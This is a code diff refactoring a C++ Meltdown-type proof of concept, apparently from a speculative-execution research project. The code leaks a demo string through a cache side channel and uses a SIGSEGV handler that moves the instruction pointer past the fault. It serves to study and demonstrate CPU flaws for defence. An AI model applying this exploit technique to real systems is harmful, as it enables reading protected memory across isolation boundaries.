@@ -16,7 +16,7 @@
 
 #include "compiler_specifics.h"
 
-#ifndef __linux__
+#if !SAFESIDE_LINUX
 #  error Unsupported OS. Linux required.
 #endif
 
@@ -36,8 +36,10 @@
 
 #include "cache_sidechannel.h"
 #include "instr.h"
+#include "local_content.h"
+#include "meltdown_local_content.h"
+#include "utils.h"
 
-const char *private_data = "It's a s3kr3t!!!";
 char *private_page = nullptr;
 
 /**
@@ -50,9 +52,9 @@ char *private_page = nullptr;
  * offset of that page is still speculatively used before the fault is
  * triggered.
  **/
-static char leak_byte(size_t offset) {
+static char LeakByte(size_t offset) {
   CacheSideChannel sidechannel;
-  const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();
+  const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();
 
   for (int run = 0;; ++run) {
     sidechannel.FlushOracle();
@@ -68,8 +70,7 @@ static char leak_byte(size_t offset) {
       MemoryAndSpeculationBarrier();
 
       // Access the non-present private_page. That leads to a SEGFAULT.
-      ForceRead(isolated_oracle.data() +
-                static_cast<size_t>(private_page[offset]));
+      ForceRead(oracle.data() + static_cast<size_t>(private_page[offset]));
 
       std::cout << "Dead code. Must not be printed." << std::endl;
 
@@ -99,41 +100,15 @@ static char leak_byte(size_t offset) {
   }
 }
 
-static void sigsegv(
-    int /* signum */, siginfo_t * /* siginfo */, void *context) {
-  // SIGSEGV signal handler.
-  // Moves the instruction pointer to the "afterspeculation" label.
-  ucontext_t *ucontext = static_cast<ucontext_t *>(context);
-#if SAFESIDE_X64
-  ucontext->uc_mcontext.gregs[REG_RIP] =
-      reinterpret_cast<greg_t>(afterspeculation);
-#elif SAFESIDE_IA32
-  ucontext->uc_mcontext.gregs[REG_EIP] =
-      reinterpret_cast<greg_t>(afterspeculation);
-#elif SAFESIDE_PPC
-  ucontext->uc_mcontext.regs->nip =
-      reinterpret_cast<size_t>(afterspeculation);
-#else
-#  error Unsupported CPU.
-#endif
-}
-
-static void set_signal() {
-  struct sigaction act;
-  act.sa_sigaction = sigsegv;
-  act.sa_flags = SA_SIGINFO;
-  sigaction(SIGSEGV, &act, NULL);
-}
-
 int main() {
-  set_signal();
+  OnSignalMoveRipToAfterspeculation(SIGSEGV);
   private_page = reinterpret_cast<char *>(mmap(nullptr, kPageSizeBytes,
       PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0));
   memcpy(private_page, private_data, strlen(private_data) + 1);
   std::cout << "Leaking the string: ";
   std::cout.flush();
   for (size_t i = 0; i < strlen(private_data); ++i) {
-    std::cout << leak_byte(i);
+    std::cout << LeakByte(i);
     std::cout.flush();
   }
   munmap(private_page, kPageSizeBytes);
